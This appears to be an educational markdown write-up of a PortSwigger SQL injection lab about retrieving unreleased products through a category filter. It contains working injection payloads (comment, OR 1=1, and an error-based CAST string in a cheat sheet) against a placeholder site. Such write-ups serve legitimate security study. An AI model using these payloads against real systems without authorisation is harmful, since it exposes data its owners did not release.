
<h1 align="center">🧠 PortSwigger SQL Injection Lab-1</h1>

<p align="center">
  <b>🔍 Retrieving Hidden Data via SQL Injection</b><br>
  <i>Lab: SQL Injection vulnerability in product category filter</i>
</p>

<p align="center">
  <img src="https://img.shields.io/badge/focus-SQL%20Injection-darkred?style=flat-square">
  <img src="https://img.shields.io/badge/goal-Display%20Unreleased%20Products-darkblue?style=flat-square">
</p>

---

## 🧠 Lab Context

> This lab contains a SQL injection vulnerability in the product category filter. The application constructs a SQL query like:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

Your goal is to perform a SQLi attack and **display unreleased products**.

---

## 🎯 Goal

✅ **Exploit SQL Injection to bypass filter and display unreleased products.**

---

## 🛠️ Basic Injection Strategy

When selecting a category, the app builds the query dynamically without sanitization:

```sql
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
```

You can inject a comment to nullify the second condition:

```http
https://insecure-website.com/products?category=Gifts'--
```

🔎 This results in:

```sql
SELECT * FROM products WHERE category = 'Gifts'--' AND released = 1
```

- `--` comments out the rest of the query.
- Now, **all products in 'Gifts'**, released or not, are shown.

---

## 🧪 Test: All Categories (OR Based)

Injecting logic always true to access everything:

```http
https://insecure-website.com/products?category=Gifts'+OR+1=1--
```

Resulting SQL:

```sql
SELECT * FROM products WHERE category = 'Gifts' OR 1=1--' AND released = 1
```

- `1=1` is always true → All products from all categories shown.

⚠️ **Warning**: Be cautious with `OR 1=1`. It can impact `UPDATE` or `DELETE` operations if reused elsewhere in code.

---

## 🧩 Injection Cheat Sheet

| Injection Type | Payload | Effect |
|----------------|---------|--------|
| Comment | `'--` | Comments out the rest |
| Boolean OR | `' OR 1=1--` | Always true condition |
| Error-Based | `' AND 1=CAST((CHR(113)||CHR(107)||CHR(112)||CHR(107)||CHR(113))||(SELECT (CASE WHEN (1=1) THEN 1 ELSE 0 END))::text||CHR(113)||CHR(122)||CHR(120)||CHR(113)||CHR(113) AS NUMERIC)--` | Can cause errors and leak info |

---

## 📚 Learning Takeaways

- SQL comments can terminate rest of a query.
- Boolean logic can bypass conditions.
- Always validate and sanitize user input.

---

## 🚨 Disclaimer

> ⚠️ For **educational purposes only**. Do **not** perform SQLi on systems you don't own or have explicit permission to test.

---

## 🧑‍💻 Author

Built with ❤️ by [PardhuVarma](https://linkedin.com/in/pardhu-sri-rushi-varma-konduru-696886279)

<p align="center">
  <img src="https://img.shields.io/badge/status-Lab%20Completed-darkgreen?style=for-the-badge">
</p>
